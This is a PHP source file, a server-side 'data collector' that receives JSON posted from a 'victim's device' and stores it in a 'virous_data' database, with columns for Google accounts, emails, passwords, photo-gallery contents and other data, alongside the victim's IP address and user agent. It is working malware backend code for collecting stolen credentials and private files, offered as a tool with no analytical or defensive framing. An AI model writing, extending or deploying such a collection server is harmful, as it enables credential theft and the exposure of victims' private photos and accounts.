<?php
/**
 * Data Collector Script
 * This script handles the collection and storage of data from the victim's device
 */

// Database configuration
$db_host = 'localhost';
$db_user = 'root';
$db_pass = '';
$db_name = 'virous_data';

/**
 * Connect to the database
 * @return mysqli|false Database connection or false on failure
 */
function connectToDatabase() {
    global $db_host, $db_user, $db_pass, $db_name;
    
    // Create connection to server
    $conn = new mysqli($db_host, $db_user, $db_pass);
    
    // Check connection
    if ($conn->connect_error) {
        logError("Database connection failed: " . $conn->connect_error);
        return false;
    }
    
    // Create database if it doesn't exist
    $sql = "CREATE DATABASE IF NOT EXISTS $db_name";
    if (!$conn->query($sql)) {
        logError("Error creating database: " . $conn->error);
        return false;
    }
    
    // Select the database
    $conn->select_db($db_name);
    
    // Create table if it doesn't exist
    $sql = "CREATE TABLE IF NOT EXISTS victim_data (
        id INT(11) AUTO_INCREMENT PRIMARY KEY,
        device_id VARCHAR(255) NOT NULL,
        ip_address VARCHAR(50) NOT NULL,
        user_agent TEXT NOT NULL,
        google_account TEXT,
        email TEXT,
        passwords TEXT,
        gallery_data LONGTEXT,
        other_data LONGTEXT,
        timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )";
    
    if (!$conn->query($sql)) {
        logError("Error creating table: " . $conn->error);
        return false;
    }
    
    return $conn;
}

/**
 * Get the client's IP address
 * @return string IP address
 */
function getIPAddress() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

/**
 * Store data in the database
 * @param mysqli $conn Database connection
 * @param array $data Data to store
 * @return bool Success or failure
 */
function storeData($conn, $data) {
    if (!isset($data['device_id'])) {
        return respondWithError("Missing device_id");
    }
    
    // Prepare data for insertion
    $device_id = $conn->real_escape_string($data['device_id']);
    $ip_address = getIPAddress();
    $user_agent = $conn->real_escape_string($_SERVER['HTTP_USER_AGENT']);
    $google_account = isset($data['google_account']) ? $conn->real_escape_string($data['google_account']) : '';
    $email = isset($data['email']) ? $conn->real_escape_string($data['email']) : '';
    $passwords = isset($data['passwords']) ? $conn->real_escape_string(json_encode($data['passwords'])) : '';
    $gallery_data = isset($data['gallery_data']) ? $conn->real_escape_string(json_encode($data['gallery_data'])) : '';
    $other_data = isset($data['other_data']) ? $conn->real_escape_string(json_encode($data['other_data'])) : '';
    
    // Insert data into database
    $sql = "INSERT INTO victim_data 
            (device_id, ip_address, user_agent, google_account, email, passwords, gallery_data, other_data)
            VALUES 
            ('$device_id', '$ip_address', '$user_agent', '$google_account', '$email', '$passwords', '$gallery_data', '$other_data')";
    
    if ($conn->query($sql)) {
        return true;
    } else {
        logError("Database insertion error: " . $conn->error);
        return false;
    }
}

/**
 * Log errors to a file
 * @param string $message Error message
 */
function logError($message) {
    $log_file = __DIR__ . '/error_log.txt';
    $timestamp = date('Y-m-d H:i:s');
    $log_message = "[$timestamp] $message" . PHP_EOL;
    file_put_contents($log_file, $log_message, FILE_APPEND);
}

/**
 * Respond with a JSON error message
 * @param string $message Error message
 * @return bool Always returns false
 */
function respondWithError($message) {
    header('Content-Type: application/json');
    echo json_encode(['status' => 'error', 'message' => $message]);
    return false;
}

/**
 * Respond with a JSON success message
 * @param array $data Additional data to include in the response
 */
function respondWithSuccess($data = []) {
    header('Content-Type: application/json');
    echo json_encode(array_merge(['status' => 'success'], $data));
}

// Only process POST requests
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get JSON data from request body
    $json_data = file_get_contents('php://input');
    $data = json_decode($json_data, true);
    
    if ($data === null) {
        respondWithError("Invalid JSON data");
        exit;
    }
    
    // Connect to database
    $conn = connectToDatabase();
    if (!$conn) {
        respondWithError("Database connection failed");
        exit;
    }
    
    // Store data
    if (storeData($conn, $data)) {
        respondWithSuccess(['message' => 'Data stored successfully']);
    } else {
        respondWithError("Failed to store data");
    }
    
    // Close connection
    $conn->close();
    exit;
} else {
    // Not a POST request
    header("HTTP/1.1 405 Method Not Allowed");
    header("Allow: POST");
    exit;
}